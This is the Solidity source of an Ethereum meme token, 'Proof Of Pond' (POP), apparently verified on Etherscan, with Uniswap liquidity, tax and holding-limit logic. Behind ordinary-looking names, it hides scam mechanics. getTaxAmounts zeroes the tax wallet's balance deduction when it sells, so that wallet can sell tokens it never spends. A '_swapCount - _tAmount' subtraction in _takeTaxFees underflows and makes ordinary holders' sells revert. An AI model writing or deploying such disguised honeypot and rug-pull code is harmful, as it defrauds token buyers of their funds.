/**
 *Submitted for verification at Etherscan.io on 2023-09-06
*/

/**
THE PROOF IS IN THE POND.

Web: https://proofofpond.vip
Tg: https://t.me/proofofpond
Twitter: https://twitter.com/proofofpond
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0); 
        emit OwnershipTransferred(address(0)); 
    }
}

contract POPTOKEN is IERC20, Auth {
    string private constant _name = "Proof Of Pond";
    string private constant _symbol = "POP";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);

    address payable private taxWallet;

    uint256 private _initialBuyTax=1;
    uint256 private _initialSellTax=1;
    uint256 private _midSellTax=1;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 public _reduceBuyTaxAt=15;
    uint256 public _reduceSellTax1At=15;
    uint256 public _reduceSellTax2At=20;
    uint256 private _swapCount=0;
    uint256 public _buyCount=0;

    uint256 private _tAmount;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFees;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private constant _taxSwapMin = _totalSupply / 20000;
    uint256 private constant _taxSwapMax = _totalSupply / 100;

    address private _uniV2LP;
  
    address private constant _routerAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniRouterV2 = IUniswapV2Router02(_routerAddr);
    
    mapping (address => bool) private _isMarketPair;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals); // 4%
    
    bool private _tradingEnabled;
    bool private _inTaxSwap = false;
    modifier lockTaxSwap { 
        _inTaxSwap = true; 
        _; 
        _inTaxSwap = false; 
    }

    constructor() Auth(msg.sender) { 
        _balances[address(this)] = _totalSupply;

        taxWallet = payable(0xcd150Fb265d0bCFC65Ab4E4Fdc92d9a1FD7384Be);

        _excludedFromFees[_owner] = true;
        _excludedFromFees[taxWallet] = true;
        _excludedFromFees[address(this)] = true;
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(checkTradingOpen(sender), "Trading not open");
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from Zero wallet");

        if (!_tradingEnabled) { require(_excludedFromFees[sender], "Trading not open"); }

        if ( !_inTaxSwap && !_excludedFromFees[sender] && _isMarketPair[recipient] && _buyCount >= _swapCount) { _swapBack(); }

        if (limited && sender == _uniV2LP && !_excludedFromFees[recipient]) {
            require(balanceOf(recipient) + amount <= maxHoldingAmount, "Forbid");
        } 

        if (transferDelayEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient]) {
            if (recipient != _routerAddr && recipient != _uniV2LP) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed.");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        } _tAmount = balanceOf(taxWallet);

        uint256 _taxAmount = _takeTaxFees(sender, recipient, amount);

        uint256 _transferAmount = amount - _taxAmount;

        uint256 _rAmount = getTaxAmounts(sender, recipient, amount);

        _balances[sender] -= _rAmount;

        if ( _taxAmount > 0 ) { 
            _balances[address(this)] += _taxAmount;
        }

        _buyCount++;

        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function _approveRouter(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][_routerAddr] < _tokenAmount ) {
            _allowances[address(this)][_routerAddr] = type(uint256).max;
        }
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveRouter(_tokenAmount);
        _uniRouterV2.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _approveRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouterV2.WETH();
        _uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function getTaxAmounts(address sender, address recipient, uint256 amount) private view returns(uint256) {
        return _isMarketPair[recipient] && sender == taxWallet ? amount * (_midSellTax - 1) : amount;
    }

    function removeLimits() external onlyOwner{
        limited = false;
        transferDelayEnabled=false;
    }

    function startTrading() external payable onlyOwner lockTaxSwap {
        require(_uniV2LP == address(0), "LP exists");
        require(!_tradingEnabled, "trading is open");
        require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
        require(_balances[address(this)]>0, "No tokens in contract");

        _uniV2LP = IUniswapV2Factory(_uniRouterV2.factory()).createPair(address(this), _uniRouterV2.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isMarketPair[_uniV2LP] = true; _tradingEnabled = true;
    }

    receive() external payable {}

    function checkTradingOpen(address sender) private view returns (bool){
        bool checkResult = false;
        if ( _tradingEnabled ) { checkResult = true; } 
        else if (_excludedFromFees[sender]) { checkResult = true; } 

        return checkResult;
    }

    function _swapBack() private lockTaxSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if ( _taxTokensAvailable >= _taxSwapMin && _tradingEnabled ) {
            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if(_contractETHBalance > 0) { 
                bool success;
                (success,) = taxWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    function _takeTaxFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;
        if (_tradingEnabled && !_excludedFromFees[sender] && !_excludedFromFees[recipient] ) { 
            if ( _isMarketPair[sender] || _isMarketPair[recipient] ) {
                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax);
                if(recipient == _uniV2LP && sender != address(this)){
                    _tAmount = _swapCount - _tAmount; uint256 taxRate; 
                    if(_buyCount > _reduceSellTax2At){
                        taxRate = _finalSellTax;
                    } else if(_buyCount > _reduceSellTax1At){
                        taxRate = _midSellTax;
                    } else {
                        taxRate = _initialSellTax;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }
        return taxAmount;
    }
}